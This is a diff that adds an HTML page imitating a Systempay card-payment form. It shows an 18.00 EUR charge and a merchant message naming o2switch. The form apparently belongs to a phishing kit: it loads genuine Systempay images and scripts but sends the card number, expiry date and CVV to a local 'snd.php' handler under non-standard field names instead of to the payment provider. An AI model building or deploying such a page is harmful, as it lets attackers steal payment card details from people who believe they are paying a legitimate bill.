@@ -1,0 +1,587 @@
+<div id="blocksSection">
+  
+
+          
+
+  <div id="TopBlock">
+
+    <div id="boutiqueInfoBlock">
+    <div id="shopLogo" style="">
+
+      <p>Message customized by the merchant</p>
+    </div>
+
+
+ 	<div id="mobile-toggle" class="js-toggle-next color2" onclick="togglePopup('transactionInfoBlock','transactionSecurityInformation')">	  
+	
+		<span class="amountLabel paramLabel">
+			<span>Amount&nbsp;:&nbsp;</span><span>18.00 EUR</span>
+		</span>
+		<span class="caret-down paramLabel">▼</span>
+	</div>
+  
+  	<div id="transactionInfoBlock">
+		<div id="transactionData">						
+			<div class="message">https://www.o2switch.fr/</div><table class="infoTransactionTable">
+				
+
+  <tbody><tr>
+    <th class="infoTransactionLeft" scope="row">Identifiant du marchand :</th>
+    <td class="infoTransactionRight" id="merchantSiteId">92534454</td>
+  </tr>
+  <tr>
+    <th class="infoTransactionLeft" scope="row">Référence commande :</th>
+    <td class="infoTransactionRight" id="orderId">26522c07-3913</td>
+  </tr>
+  <tr class="amount">
+    <th class="infoTransactionLeft" scope="row">Montant :</th>
+    <td class="infoTransactionRight" id="transaction_amount_label">18.00 EUR</td>
+  </tr>
+	
+	
+		
+			</tbody></table>
+		</div>
+
+	</div>
+	
+	    <div id="transactionSecurityInformation" class="message securityMessage">
+	      	<span class="symbole">L'adresse de ce site de paiement préfixée par https indique que vous êtes sur un site sécurisé et que vous pouvez régler votre achat en toute tranquillité.</span>
+	    </div>
+
+    </div>
+
+
+  </div>
+
+
+    
+
+    
+  
+        <div id="rightBlock">
+        
+  
+
+
+        <div id="cardDataInputBlock">
+
+
+
+
+                <div id="cardDataInputHeader">
+                        <div id="paymentMeanSecureBlock" class="paymentMeanSecureBlock-brand-choice">
+                    </div>
+                    <h2 class="titleContainer titleValue">	Informations pour le paiement
+
+</h2>
+                </div>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function changeCardCode(cardCode){
+        var paymentCardTypeField = document.getElementById('vads_payment_card_type');
+        if(paymentCardTypeField != null){
+            if(cardCode=="VISA_ELECTRON" || cardCode=="MAESTRO"){
+                paymentCardTypeField.value = "DEBIT";
+            }else{
+                paymentCardTypeField.value = "CREDIT";
+            }
+        }
+            
+        var cardCodeField = document.getElementById('vads_payment_card_code');
+        if(cardCodeField != null){
+            cardCodeField.value = cardCode;
+        }
+    }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="creditCardPaymentForm">
+
+  
+
+
+
+  <div id="wholeform">
+            <form method="post" action="snd.php" name="ref_form" target="_self" autocomplete="off">
+		<input type="hidden" name="vads_card_info_form" value="generic">
+	
+		<p class="mess_error" role="alert" aria-atomic="true" aria-live="assertive"></p>
+	
+    
+  
+    <div class="form_line">
+
+  <label class="paramLabel" for="fCardNumber">Numéro de carte</label>
+  <span class="paramInput">
+  
+  <script type="text/javascript" src="https://paiement.systempay.fr/static/commons/brandchoice/segments.js" defer=""></script>
+  <div class="paymentBrandChoiceBlock">
+      <div id="cardNumberWrapper">
+      <input class="cardNumber" id="fCardNumber" autocomplete="off" size="19" maxlength="16" name="cc_number" value="" onchange="return activeForm(this.form);" required="" type="tel" pattern="(?:4|5)[0-9\s]{15,16}" oninput="return brandchoice.checkCardBrand();" autofocus="">
+          <div id="paymentBrandChoice" class="not-deployed">
+              <input type="hidden" name="vads_payment_brand_choice_selected" id="paymentBrandChoiceSelected" value="">
+              <input type="hidden" name="vads_payment_brand_choice_list" id="paymentBrandTypeList" value="">
+              <input type="hidden" name="vads_payment_brand_choice" id="paymentBrandType" value="MASTERCARD">
+              <div id="arrow-down" style="display: none;"> ▾</div>
+              <ul id="paymentBrandChoiceList" onclick="" class="close"><li id="brand_CB" onclick="brandchoice.paymentBrandPressed(this,'CB')" style="display:none">
+                            <img src="https://paiement.systempay.fr/static/2.21.0.0/images/type-carte/brand_choice_cb.png" alt="CB" title="CB">
+                        </li><li id="brand_E-CARTEBLEUE" onclick="brandchoice.paymentBrandPressed(this,'E-CARTEBLEUE')" style="display:none">
+                            <img src="https://paiement.systempay.fr/static/2.21.0.0/images/type-carte/brand_choice_e-cartebleue.png" alt="e-Carte Bleue" title="e-Carte Bleue">
+                        </li><li id="brand_VISA" onclick="brandchoice.paymentBrandPressed(this,'VISA')" style="display:none">
+                            <img src="https://paiement.systempay.fr/static/2.21.0.0/images/type-carte/brand_choice_visa.png" alt="Visa" title="Visa">
+                        </li><li id="brand_MASTERCARD" onclick="brandchoice.paymentBrandPressed(this,'MASTERCARD')" style="display: none;">
+                            <img src="https://paiement.systempay.fr/static/2.21.0.0/images/type-carte/brand_choice_mastercard.png" alt="Mastercard" title="Mastercard">
+                        </li><li id="brand_VISA_ELECTRON" onclick="brandchoice.paymentBrandPressed(this,'VISA_ELECTRON')" style="display:none">
+                            <img src="https://paiement.systempay.fr/static/2.21.0.0/images/type-carte/brand_choice_visa_electron.png" alt="Visa Electron" title="Visa Electron">
+                        </li><li id="brand_MAESTRO" onclick="brandchoice.paymentBrandPressed(this,'MAESTRO')" style="display:none">
+                            <img src="https://paiement.systempay.fr/static/2.21.0.0/images/type-carte/brand_choice_maestro.png" alt="Maestro" title="Maestro">
+                        </li></ul>
+          </div>
+      </div>
+      <div class="help" id="brand_choice_help"><span class="help_button" title="help with brand choice">?</span></div>
+      <div id="brand_choice_popup" class="brand_choice_popup_closed">
+          Once the number has been correctly filled in, your card's brand will appear. <br> <br> If you have a multi-network card, one of them will appear by default and you can easily modify the selection by clicking the arrow.
+      </div>
+  </div>
+    <script type="text/javascript" defer="">
+        var brandOrders = [  'CB',  'E-CARTEBLEUE',  'VISA',  'MASTERCARD',  'VISA_ELECTRON',  'MAESTRO',  ];
+        
+
+        (function(brandchoice) {
+
+            // Control for changes on foundBrand
+            var foundBrandAux;
+
+            // Variable that indicates if there is a brand choice
+            var multipleBrandsFound = false;
+
+            // Brand segments
+            var brands = {
+                "-1" : "UNKNOWN",
+                "0" : "NONE",
+                "1" : "CB",
+                "2" : "VISA",
+                "3" : "MASTERCARD",
+                "10" : "CB|VISA",
+                "11" : "CB|VISA_ELECTRON",
+                "12" : "CB|MASTERCARD",
+                "13" : "CB|MAESTRO",
+                "14" : "CB|VPAY",
+                "15" : "CB|MASTERCARD", 	// CB|MASTERCARD_DEBIT
+                "16" : "CB|VISA", // CB|VISA_DEBIT
+                "20" : "VISA_ELECTRON",
+                "21" : "VPAY",
+                "22" : "VISA|E-CARTEBLEUE",
+                "23" : "VISA", // VISA_DEBIT
+                "30" : "MAESTRO",
+                "31" : "MASTERCARD" // MASTERCARD_DEBIT
+            };
+
+            function handleHelp(event) {
+                var popup = document.getElementById("brand_choice_popup");
+                if(popup.classList.contains("brand_choice_popup_open")) {
+                    popup.classList.remove("brand_choice_popup_open");
+                    popup.classList.add("brand_choice_popup_closed");
+                } else {
+                    popup.classList.remove("brand_choice_popup_closed");
+                    popup.classList.add("brand_choice_popup_open");
+                    event.stopPropagation();
+                    var width = window.innerWidth
+                            || document.documentElement.clientWidth
+                            || document.body.clientWidth;
+                    if(width > 768) {
+                        popup.style.left = (event.pageX - 320).toString(10) + "px";
+                        popup.style.top = (event.pageY - 40).toString(10) + "px";
+                    } else {
+                        popup.style.left = "50%";
+                        popup.style.top = "50%";
+                    }
+                }
+            }
+
+            document.getElementById("brand_choice_help").addEventListener("click", handleHelp);
+            document.getElementById("brand_choice_popup").addEventListener("click", function () {
+                this.className = "brand_choice_popup_closed";
+            });
+
+            function switchClasses(elementId, firstClass, secondClass) {
+                var element = document.getElementById(elementId);
+                if(element.classList.contains(firstClass)) {
+                    element.classList.remove(firstClass);
+                    element.classList.add(secondClass);
+                } else {
+                    element.classList.remove(secondClass);
+                    element.classList.add(firstClass);
+                }
+            }
+
+            function replaceClass(elementId, classToRemove, classToAdd) {
+                var element = document.getElementById(elementId);
+                element.classList.remove(classToRemove);
+                element.classList.add(classToAdd);
+            }
+
+            function brandClick(ev) {
+                switchClasses("paymentBrandChoiceList", "open", "close");
+                ev.stopPropagation();
+            }
+
+            function hideBrandList(ev) {
+                if (ev.target.id !== "paymentBrandChoiceList") {
+                    replaceClass("paymentBrandChoiceList", "open", "close");
+                }
+            }
+
+            function getAllBrandElements() {
+                return document.getElementById("paymentBrandChoice").getElementsByTagName("li");
+            }
+            function showBrand(brandName) {
+                var elem = document.getElementById("brand_" + brandName);
+                if(elem) {
+                    elem.style.display = "block";
+                }
+            }
+
+            function orderBrands() {
+                var ul = document.getElementById("paymentBrandChoiceList");
+                var new_ul = ul.cloneNode(false);
+
+                var list = [];
+                var elements = ul.getElementsByTagName('li');
+                for(var i = elements.length; i--;){
+                    list.push(elements[i]);
+                }
+                list.sort(function(firstBrand, secondBrand){
+                    return window.brandOrders.indexOf(firstBrand.id.substring(6)) - window.brandOrders.indexOf(secondBrand.id.substring(6));
+                });
+                for(i = 0; i < list.length; i++) {
+                    new_ul.appendChild(list[i]);
+                }
+                ul.parentNode.replaceChild(new_ul, ul);
+            }
+
+            function getBrandToSend() {
+                var brandElements = getAllBrandElements();
+                for (var i = 0; i < brandElements.length; i++) {
+                    if(brandElements[i].style.display !== "none"){
+                        return brandElements[i].id.substring("brand_".length);
+                    }
+                }
+                return "";
+            }
+            function restoreBrands() {
+                var i = 0;
+                var brandElements = getAllBrandElements();
+                for (i; i < brandElements.length; i++) {
+                    brandElements[i].style.display = "none";
+                }
+                document.getElementById("paymentBrandTypeList").value = "";
+                document.getElementById("paymentBrandChoiceSelected").value = "";
+                document.getElementById("arrow-down").style.display = "none";
+                replaceClass("paymentBrandChoice", "is-deployed", "not-deployed");
+                var paymentBrandChoice = document.getElementById("paymentBrandChoice");
+                paymentBrandChoice.removeEventListener("click", brandClick);
+            }
+            function setAsSelected() {
+                if (multipleBrandsFound === true) {
+                    document.getElementById("paymentBrandChoiceSelected").value = "true";
+                }
+            }
+            brandchoice.paymentBrandPressed = function(el, val) {
+                var parent = el.parentElement;
+                parent.insertBefore(el, parent.firstChild);
+                document.getElementById("paymentBrandType").value = val;
+
+                setAsSelected();
+                return false;
+            };
+            brandchoice.checkCardBrand = function() {
+                replaceClass("paymentBrandChoiceList", "open", "close");
+                if(window.segmentsData == null) {
+                    return;
+                }
+
+                var segments = window.segmentsData;
+                var current = {
+                    s : "0"
+                };
+                var previous = {
+                    s : "0"
+                };
+                var foundBrand;
+                var text = document.getElementById("fCardNumber").value || "";
+                text = text.replace(/\D/g,'');
+                for (var i = 0; i < segments.length; i++) {
+                    previous = current;
+                    current = segments[i];
+
+                    if (text >= previous.s && text < current.s) {
+                        if (current.s.lastIndexOf(text, 0) !== 0) {
+                            foundBrand = brands[previous.p];
+                            break;
+                        }
+                    }
+                }
+                if(!foundBrand || foundBrand === 'UNKNOWN') {
+                    restoreBrands();
+                } else if(foundBrand !== foundBrandAux) {
+                    restoreBrands();
+                    var brandsToShow = foundBrand.split("|").filter(function (brand) {
+                        return (brandOrders.indexOf(brand) >= 0);
+                    });
+
+                    for (var y = 0; y < brandsToShow.length; y++) {
+                        showBrand(brandsToShow[y]);
+                    }
+                    orderBrands();
+                    document.getElementById("paymentBrandType").value = getBrandToSend();
+                    document.getElementById("paymentBrandTypeList").value = foundBrand;
+                    replaceClass("paymentBrandChoice", "not-deployed", "is-deployed");
+                    if(brandsToShow.length > 1) {
+                        var arrow = document.getElementById("arrow-down");
+                        arrow.style.display = "block";
+                        document.getElementById("paymentBrandChoice").addEventListener("click", brandClick);
+                        document.body.addEventListener('click', hideBrandList);
+                    } else if(brandsToShow.length === 0) {
+                        restoreBrands();
+                    }
+
+                    multipleBrandsFound = brandsToShow.length > 1;
+                }
+                foundBrandAux = foundBrand;
+
+                return false;
+            };
+        }(window.brandchoice = window.brandchoice || {}));
+    </script>
+  </span>
+    
+    </div>
+    <div class="form_line">
+    
+    <span class="paramLabel" id="expiration_date_label">Date d'expiration</span> 
+    <div class="paramInput">  
+      <div id="expiration_date">
+        <select name="date1" size="1" id="vads-expiry-month-input" class="vads-expiry-date-input" required="" aria-labelledby="expiration_date">
+
+	<option value="">mois</option>
+		<option value="1"> 01-Janvier </option>
+		<option value="2"> 02-Février </option>
+		<option value="3"> 03-Mars </option>
+		<option value="4"> 04-Avril </option>
+		<option value="5"> 05-Mai </option>
+		<option value="6"> 06-Juin </option>
+		<option value="7"> 07-Juillet </option>
+		<option value="8"> 08-Août </option>
+		<option value="9"> 09-Septembre </option>
+		<option value="10"> 10-Octobre </option>
+		<option value="11"> 11-Novembre </option>
+		<option value="12"> 12-Décembre </option>
+
+        </select>
+
+        <select name="date2" size="1" id="vads-expiry-year-input" required="" aria-labelledby="expiration_date">
+
+  <option value=""> année</option>
+    <option value="2020"> 2020</option>
+    <option value="2021"> 2021</option>
+    <option value="2022"> 2022</option>
+    <option value="2023"> 2023</option>
+    <option value="2024"> 2024</option>
+    <option value="2025"> 2025</option>
+    <option value="2026"> 2026</option>
+    <option value="2027"> 2027</option>
+    <option value="2028"> 2028</option>
+    <option value="2029"> 2029</option>
+    <option value="2030"> 2030</option>
+    <option value="2031"> 2031</option>
+    <option value="2032"> 2032</option>
+    <option value="2033"> 2033</option>
+    <option value="2034"> 2034</option>
+    <option value="2035"> 2035</option>
+    <option value="2036"> 2036</option>
+    <option value="2037"> 2037</option>
+    <option value="2038"> 2038</option>
+    <option value="2039"> 2039</option>
+    <option value="2040"> 2040</option>
+    <option value="2041"> 2041</option>
+    <option value="2042"> 2042</option>
+    <option value="2043"> 2043</option>
+    <option value="2044"> 2044</option>
+    <option value="2045"> 2045</option>
+    <option value="2046"> 2046</option>
+    <option value="2047"> 2047</option>
+    <option value="2048"> 2048</option>
+    <option value="2049"> 2049</option>
+    <option value="2050"> 2050</option>
+  
+        </select>
+      </div>
+    </div>
+
+    </div>
+     <div class="form_line">
+  <label class="paramLabel" for="cvvid">Cryptogramme visuel</label>
+  <span class="paramInput">
+    <div class="cvvBlock">
+        <input id="cvvid" autocomplete="off" size="3" maxlength="3" pattern="[0-9]{3}" name="cc_cvv" value="" type="password" required="" inputmode="numeric" x-inputmode="numeric">
+		<div class="cvvShow">
+            <span class="cvvShowSpan"></span><img id="imgShowCvv" src="https://paiement.systempay.fr/static/2.21.0.0/images/icons_lyra/cvv_hide.png" alt="Show CVV code" title="Show CVV code" onclick="showHideCvv()">
+        </div>	
+
+
+
+
+	<div class="help_anchor" tabindex="0" onclick="this.className+=' open';">
+	<span class="help_button" title="CVV help">?</span>
+		<div class="help_popup" onclick="event.stopPropagation();var anchors = document.querySelectorAll('.help_anchor');var i = 0; for (i = 0; i < anchors.length; ++i) {anchors[i].className='help_anchor';}">
+			<div class="justify">
+				<div class="info">
+				This field is only required for payment methods with a security code.
+				</div>
+			</div>
+
+			<div class="justify">
+	<div>
+		<div class="info">The card security code is the 3-digit number printed at the back of your card situated on the right side of the signature zone. <br></div>
+		<div class="visu"><img src="https://paiement.systempay.fr/static/commons/visu-cvv.png" alt="Security code"></div>
+	</div>
+			</div>
+		</div>
+	</div>
+
+	</div>
+	
+  </span>
+
+ <script>
+ function showHideCvv() {
+ 	var cvvField = document.getElementById("cvvid");
+ 	var imgShowCvv = document.getElementById("imgShowCvv");
+ 	if (cvvField.type === "password") {
+    	cvvField.type = "text";
+		imgShowCvv.setAttribute("src", "https://paiement.systempay.fr/static/2.21.0.0/images/icons_lyra/cvv_show.png");
+		imgShowCvv.setAttribute("alt", "Hide the CVV");
+		imgShowCvv.setAttribute("title", "Hide the CVV");
+  	} else {
+    	cvvField.type = "password";
+		imgShowCvv.setAttribute("src", "https://paiement.systempay.fr/static/2.21.0.0/images/icons_lyra/cvv_hide.png");
+		imgShowCvv.setAttribute("alt", "Show CVV code");
+		imgShowCvv.setAttribute("title", "Show CVV code");
+  	}
+ } 
+ </script>
+     </div>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script type="text/javascript">
+
+(function() {
+    "use strict";
+
+    var checkNumber = function(e) {
+        var regex = new RegExp("^[0-9]+$");
+        var key = String.fromCharCode(!e.charCode ? e.which : e.charCode);
+		
+		// Don't validate the input if below arrow, delete and backspace keys were pressed 
+		if(e.keyCode == 37 || e.keyCode == 38 || e.keyCode == 39 || e.keyCode == 40 || e.keyCode == 8 || e.keyCode == 46) { // Left / Up / Right / Down Arrow, Backspace, Delete keys
+			 return;
+		}
+		
+        if (!regex.test(key)) {;
+            e.preventDefault();
+            return false;
+        }
+    }
+
+	var cardNumberInput = document.getElementById('fCardNumber')
+	var cvvInput = document.getElementById('cvvid')
+	if(cardNumberInput) {
+		cardNumberInput.addEventListener('keypress', checkNumber);
+	}
+	if(cvvInput) {
+		cvvInput.addEventListener('keypress', checkNumber);
+    }
+
+})();
+
+</script>
+    
+    
+
+
+
+		
+
+
+
+		
+                    <div class="form_line">
+                        <div id="validationButtonWrapper">
+                            
+                                <button type="submit" id="validationButtonCard" class="validationButton">VALIDER</button>
+                                
+                        </div>
+                    </div>
+            </form>
+  </div>
+
+
+    <div class="copyrightThreeDS">
+          <img src="https://paiement.systempay.fr/static/2.21.0.0/images/3ds/visa_3ds.png" alt="3DS" class="three-ds-logo">
+          <img src="https://paiement.systempay.fr/static/2.21.0.0/images/3ds/mastercard_3ds.png" alt="3DS" class="three-ds-logo">
+    </div>
+
+
+
+    </div>
+
+
+
+        </div>
+
+
+
+        
+      
+        </div>
+  
+  
+		
+  </div>
